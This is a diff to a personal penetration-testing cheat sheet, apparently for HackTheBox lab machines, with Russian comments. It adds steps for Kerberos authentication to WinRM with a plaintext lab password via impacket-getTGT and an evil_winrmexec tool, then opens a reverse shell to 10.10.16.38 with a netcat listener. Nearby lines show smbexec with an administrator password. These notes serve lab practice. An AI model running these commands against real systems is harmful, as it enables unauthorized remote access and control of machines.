@@ -221,7 +221,18 @@ scrm.local = SCRM.LOCAL
 
 	nxc smb dc.voleur.htb -d voleur.htb -k --generate-krb5-file krb5.conf
 	sudo mv krb5.conf /etc/krb5.conf
+# Можно использовать winrm проще (по керберос)
 
+	impacket-getTGT hercules.htb/auditor:'Prettyprincess123!'
+	export KRB5CCNAME=auditor.ccache
+	git clone https://github.com/ozelis/winrmexec
+	python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
+	и запуститьь реверс шелл так как это псевдооболочка
+	
+	winrm> !revshell 10.10.16.38 4242
+	
+	$ rlwrap nc -lnvp 4242
+	
 # smbexec
 	smbexec administrator:pasword123@192.168.50.200
 
